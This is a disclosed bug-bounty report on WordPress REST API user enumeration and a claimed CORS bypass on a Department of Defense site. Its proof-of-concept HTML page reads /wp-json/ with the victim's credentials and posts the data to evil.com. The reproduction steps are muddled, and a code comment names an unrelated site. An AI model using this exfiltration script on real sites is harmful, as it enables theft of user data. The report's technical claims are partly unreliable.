# Bypassing CORS Misconfiguration Leads to Sensitive Exposure

## Report Details
- **Report ID**: 768151
- **URL**: https://hackerone.com/reports/768151
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-01-04T15:52:16.243Z
- **Disclosed**: 2020-05-14T17:16:51.417Z

## Reporter
- **Username**: deb0con
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Hi!** Security Team @deptofdefense, 
It's possible to get information about the users registered (such as: id, name, login name, etc.) without authentication in 
Wordpress via API on 
*. ███████.

***Description:***
By default Wordpress allow public access to Rest API to get informations about all users registered on the system.

Platform(s) Affected: [website]
*. https://████/wp-json/

##Steps To Reproduce:
1) Repreat URL Vulnerable to Burp Suite
2) If you add the ``Origin-parameter`` to the ``Request-header``, the responsive header will reject
3) Bypassing Using Exploit CORS-With Sensitive
4) Open Request Vulnerability URL in ``/wp-json/` , when you open the url, you can see ``path-routes`` disclousure
**Proof On Concept:**
```javascript
<!DOCTYPE html>
<html>
<body>
<center>
<h3>Steal customer data!</h3>
<html>
<body>
<button type='button' onclick='cors()'>Exploit</button>
<p id='demo'></p>
<script>
function cors() {
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState == 4 && this.status == 200) {
var a = this.responseText; // Sensitive data from niche.co about user account
document.getElementById("demo").innerHTML = a;
xhttp.open("POST", "http://evil.com", true);// Sending that data to Attacker's website
xhttp.withCredentials = true;
console.log(a);
xhttp.send("data="+a);
}
};
xhttp.open("GET", "https://██████/wp-json/", true);
xhttp.withCredentials = true;
xhttp.send();
}
</script>
</body>
</html>
```
6) save file as ``.html`` and open in mozzila-firefox , and **boom** sensitive has been exposure
**Remediation:**
There are 2 ways that it's possible to fix this problem.
**FIX 1** - It's possible to remove this access for anyone by change the source code where when someone request the Rest API and the server send a 404 (Not Found) message for the user who made the request. 
Reference: https://github.com/WP-API/WP-API/issues/2338
**FIX 2** - It's also possible to create a rewrite rule on .htaccess (if the webserver it's Apache) to redirect any request that contain rest_route (eg.: "^.rest_route=/wp/") to a Not Found (404) or a Default Page.

##POC Screenshots Material/References:
  * ███████
  * █████████
  * █████

## Impact

1. It's possible to get all the users registered on the system and create a bruteforce directed to these users.
2. Cross Misconfiguration -Leakage Sensitive Information

## Attachments
No attachments
